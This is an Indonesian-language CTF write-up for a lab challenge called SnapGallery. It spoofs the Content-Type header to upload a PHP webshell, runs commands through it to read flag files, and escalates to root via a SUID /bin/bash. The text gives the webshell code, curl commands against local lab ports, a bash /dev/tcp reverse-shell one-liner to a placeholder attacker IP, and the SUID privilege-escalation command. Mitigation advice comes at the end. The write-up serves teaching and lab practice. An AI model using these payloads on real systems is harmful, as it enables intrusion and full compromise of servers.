# WRITEUP · 03 SnapGallery (SPOILER)

## 1. Recon

Ada form upload foto. Coba upload file teks biasa → ditolak dengan pesan:
`Hanya gambar (JPEG/PNG/GIF) yang diperbolehkan. Tipe: text/plain`.

Pesan itu menyebut **Tipe** = `Content-Type`. Artinya validasi memeriksa MIME
yang dikirim client — dan itu bisa dipalsukan.

## 2. Bypass & dapatkan RCE

Buat webshell PHP:

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
```

Upload lewat curl, **paksa Content-Type jadi image** (walau isinya PHP). Nama
field form-nya `photo`:

```bash
# Lite  (port 9003):
curl -s -F 'photo=@shell.php;type=image/png' http://127.0.0.1:9003/upload.php
# Docker (port 8003):
curl -s -F 'photo=@shell.php;type=image/png' http://127.0.0.1:8003/upload.php
```

Respons: `Berhasil di-upload: shell.php`. File disimpan apa adanya di `uploads/`.

Jalankan perintah lewat webshell:

```bash
curl -s 'http://127.0.0.1:9003/uploads/shell.php?c=id'
```

> Catatan: server bawaan PHP (`php -S`, dipakai mode lite) hanya mengeksekusi
> file berekstensi `.php`. Karena itu MIME-bypass ini cocok: nama `shell.php`
> dipertahankan sehingga file benar-benar dijalankan sebagai PHP.

## 3. Flag user

**Lite:** webshell berjalan dengan direktori kerja di `uploads/`. Flag `user.txt`
ada di folder instance, dua tingkat di atasnya:

```bash
curl -s 'http://127.0.0.1:9003/uploads/shell.php?c=cat%20../../user.txt' | grep -o 'FLAG{[^}]*}'
# kalau ragu posisinya, cari saja:
curl -s 'http://127.0.0.1:9003/uploads/shell.php?c=find%20/%20-name%20user.txt%202>/dev/null'
```

**Docker:** flag di home user `snapper`:

```bash
curl -s 'http://127.0.0.1:8003/uploads/shell.php?c=cat%20/home/snapper/user.txt' | grep -o 'FLAG{[^}]*}'
```

(Spasi di URL = `%20`, atau pakai `--data-urlencode` / bungkus `c` dengan Burp.)

### Reverse shell (opsional)

```bash
# penyerang:
nc -lvnp 4444
# webshell (ganti IP):
?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<IP>/4444%200>%261'
```

## 4. Privilege escalation ke root (Docker)

Webshell berjalan sebagai `www-data`. Cari binary ber-SUID:

```bash
?c=find%20/%20-perm%20-4000%20-type%20f%202>/dev/null
```

`/bin/bash` muncul dengan bit SUID — salah konfigurasi. `bash -p` menjaga
privilege efektif root:

```bash
?c=/bin/bash%20-p%20-c%20'id;cat%20/root/root.txt'
# uid=33(www-data) euid=0(root) ... FLAG{...}
```

## 5. Pelajaran & mitigasi

- **Jangan percaya `Content-Type` dari client.** Verifikasi tipe file sebenarnya
  di server (mis. `finfo`/magic bytes), tetap saja itu tidak cukup sendirian.
- **Jangan simpan file dengan nama/ekstensi dari user.** Buat ulang nama acak dan
  tetapkan ekstensi dari whitelist yang aman.
- **Matikan eksekusi di folder upload** (konfigurasi server agar `uploads/` tidak
  menjalankan skrip), dan simpan file di luar web root bila bisa.
- **SUID pada shell** (`/bin/bash`, `/bin/sh`, dll.) = root instan bagi siapa pun.
  Audit SUID secara rutin; jalankan layanan dengan hak minimum.
